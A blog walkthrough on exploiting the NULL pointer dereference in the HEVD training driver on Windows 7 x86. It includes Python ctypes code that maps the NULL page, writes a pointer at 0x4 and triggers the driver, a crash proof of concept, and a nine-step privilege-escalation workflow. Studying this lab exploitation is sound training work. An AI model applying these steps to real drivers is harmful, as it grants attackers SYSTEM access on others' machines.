---
layout: single
title: HEVD - Windows 7 x86 Kernel NULL Pointer Dereference
---

Walkthrough for the HEVD Windows Kernel Driver exploitation, exploiting a NULL Pointer Dereference vulnerability. let's get this out of the way since I have a bunch of un-disclosed 0day's (which happen to be NULL Pointer Derefence vulnerabilities) so this post will expand on what the vulnerability is, how to debug it, and how to exploit it.

----

**Understanding NULL Pointer Derefence vulnerabilities**

NULL Pointer Dereference vulnerabilities are found within C/C++ code. A NULL Pointer Dereference vulnerability occurs when the value of a pointer is set to NULL and it's being used by the application to point to a valid memory location. Normally, the NULL pointer is supposed to point to an area of memory that is invalid. 

As an attacker, if you can take control of the NULL page, you can allocate memory in that location, write to it your shellcode token stealing payload and get code execution/EOP.

- https://cwe.mitre.org/data/definitions/476.html

----

**HEVD - Vulnerable function code analysis**

The nullpointerderefence.c source code file provided includes various function allocations at the top.

```c++
NTSTATUS TriggerNullPointerDereference(_In_ PVOID UserBuffer)
{
    ULONG UserValue = 0;
    ULONG MagicValue = 0xBAD0B0B0;
    NTSTATUS Status = STATUS_SUCCESS;
    PNULL_POINTER_DEREFERENCE NullPointerDereference = NULL;
```

In IDA you can see the if, else statement taking place where it's comparing the UserValue to EAX (the MagicValue)

![ida 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/ida1.png)

And scrolling down reveals the function which shows the pool chunk allocation taking place.

```c++
NullPointerDereference = (PNULL_POINTER_DEREFERENCE)ExAllocatePoolWithTag(
  NonPagedPool,
  sizeof(NULL_POINTER_DEREFERENCE),
  (ULONG)POOL_TAG
);
```
![ida 1](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/ida2.png)

Here we can see the pool tag "Hack", the magic value and the offset of 0x4, 0x4 is the location that we can write our shellcode to and gain code execution.

----

**IOCTL Discovery with IDA**

There are a few methods/ways we can discover the needed IOCTL for communicating with this aspect of the kernel-mode driver.

Manual calculation

From the source code of the driver, we can use the CTL_MACRO to obtain the different values of the IOCTL.

![macro from source](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/nullprt_calc_ioctl.png)

Which can use with Python to easily calculate the IOCTL for this scenario.

![python ioctl calc](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/ioctl_null_pythoncalc.png)
----

**Fuzz for a crash?**

Once we have the IOCTL we need, we can quickly use IDA Pro's plugin again to obtain the symlink driver device name so we can fuzz it for a BSOD crash. We can use the kDriverFuzzer with the discovered IOCTL and device name to crash the system.

----

**Memory management exploitation**

For the memory manipulation/exploitation aspect of a NULL Pointer Dereference vulnerability POC, you will need to utilize the `NtAllocateVirtualMemory` function for allocating the NULL memory page.

**NtAllocateVirtualMemory**

```c++
__kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
  HANDLE    ProcessHandle,
  PVOID     *BaseAddress,
  ULONG_PTR ZeroBits,
  PSIZE_T   RegionSize,
  ULONG     AllocationType,
  ULONG     Protect
);
```

The break down for this MSDN Microsoft function is as follows.

- You set the process handler that you want the mapping to occur with which is `0xFFFFFFFF`. Then you provide a pointer to the variable that will obtain the base address of the allocated region of pages which our parameter will be filled out with `byref(c_void_p(0x1))`. Next, the `BaseAddress` parameter is going to be set to 0. The other important parts of this function definition are the region size and allocation type.

For our HEVD exploit, using Python you can write out this function like so.

```python
dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
if dwStatus != STATUS_SUCCESS:
    print("[+] Failed allocating the null paged memory: %s" % dwStatus)
    else:
        print("\t[+] Successfully allocated NULL memory page")
```

**WriteProcessMemory**

```c++
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

After we allocate the NULL page, we can write to the location via the `WriteProcessMemory` function, the way this works parameter by parameter is as follows. The `hProcess` member is a handle to the process memory that's going to be modified, which is our current process. You can either use a Python ctypes `GetCurrentProcess()` function or provide it with `0xFFFFFFF`, then you provide the base address of the allocated region page that we want to write to, in this case, it's `0x00000004` which can be found in the TriggerNullPointerDerefence function in IDA Pro with the code `call dword ptr [esi+4]` this is going to be the location will be writing to.

For our HEVD exploit in Python you can use this function as so.

```python
if kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, payload_final, 0x400, byref(c_ulong())):
    print("[+] success writing to memory")
```

----

**Crash analysis to understand our exploit**

Before we get into the shellcode management section, let's conduct some crash analysis where we can understand and learn more about how our allocation/memory writing will pan out. We can start by running a minimized/skeleton version of our exploit which excludes a real shellcode payload.

This BSOD POC will allocate the NULL memory page, and write a 4-byte shellcode payload (41414141) to our specified memory location.

```python
import ctypes, sys, struct
from ctypes import *
from subprocess import *
 
def main():
    kernel32 = windll.kernel32
    psapi = windll.Psapi
    ntdll = windll.ntdll
    
    hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
    shellcode = id("\x41" * 4) + 20
    
    ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(c_void_p(0x1)), 0, byref(c_ulong(0x100)), 0x3000, 0x40)
    kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, shellcode, 0x40, byref(c_ulong()))
    
    buf = '\x90\x90\x90\x90'
    bufLength = len(buf)
    
    kernel32.DeviceIoControl(hevDevice, 0x22202b, buf, bufLength, None, 0, byref(c_ulong()), None)
 
if __name__ == "__main__":
    main()
```



**Before memory allocation**

Before you allocate the payload, you can break the running process (debuggee) and use the command `dd 0x00000004` to view the memory at that specific location.

![before allocation of the memory](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/nullptr-before-alloc.png)

You can see that before our allocation, the memory addresses are all filled with `????????` which shows that they are NULL.

**After memory allocation**

After you allocate the memory and send our "shellcode" payload (41414141), if you set a breakpoint on the vulnerable function or have the system BSOD (crash) after you allocated the memory, you can see the pointer to your shellcode payload is located in `0x00000004`.

![after memory alloc, written]()

For now it's only displaying the raw shellcode, which is why you will need to follow the upcoming VirtualAlloc manipulation to obtain a pointer which you can write to memory, because for your actual EOP payload, you want it to display the pointer, and not the raw shellcode in `0x0000004`

----

Now, in the sense of a NULL Pointer Dereference vulnerability and exploit development procedure, an attacker can follow the workflow as stated below.

**NULL Pointer dereference workflow**

1. Obtain handler to device driver - Using the CreateFileA() function
2. Allocate a certain amount of memory --> Using the NtAllocateVirtualMemory() function
3. Create a token stealing shellcode payload --> You may need to provide a cleanup routine
4. Create a pointer to your shellcode --> Using the VirtualAlloc() function 
5. Move your shellcode into your VirtualAlloc buffer --> Using the RtlMoveMemory() function
6. Pack your shellcode payload and create a little-endian format --> Using struct
7. Write your shellcode payload to the specific location --> Using the WriteProcessMemory() function
8. Trigger the entire exploit by sending everything to the driver --> Using the DeviceIoControl() function
9. Spawn a new elevated command prompt -->  Using the stolen System token

----

**Proper shellcode creation/management**

Beyond using the allocation and write functions for our exploitation, we will also need to use some new functions for creating a pointer to our shellcode, which is going to be our payload that we write into memory to have the NULL pointer pointing at. 

We can use the `VirtualAlloc()` function combined with the `RtlMoveMemory()` function to take our shellcode and obtain the pointer to it. 

```python
ptr = kernel32.VirtualAlloc(c_int(0), c_int(len(shellcode)), c_int(0x3000), c_int(0x40))
buff = (c_char * len(shellcode)).from_buffer(shellcode)
kernel32.RtlMoveMemory(c_int(ptr), buff, c_int(len(shellcode)))
```
----

**Let's grab System!**

After following the specified memory management and provided workflow for this exploitation technique, you should be able to spawn a new command prompt with elevated permissions.

![EOP](https://raw.githubusercontent.com/FULLSHADE/Windows-Kernel-Exploitation-HEVD/master/images/hevd-null-ptr-shell.png)

----

**Wrapup & conclusion**

NULL Pointer Derefences is a very commonly discovered vulnerability class, especially in complex drivers, proper exploitation of this vulnerability can lead to an unprivileged attacked to write and execute shellcode in kernel-mode. Granting the attack an elevated sense of permissions on the system.

----

**Exploitation on a 64-bit system**

If you try and exploit this on a 64-bit system, you will run into a `NtAllocateVirtualMemory` problem which is denying memory allocation to control if the `BaseAddress` is below 0x1000. This can be shown via a `STATUS_INVALID_PARAMETER_2` status error. 
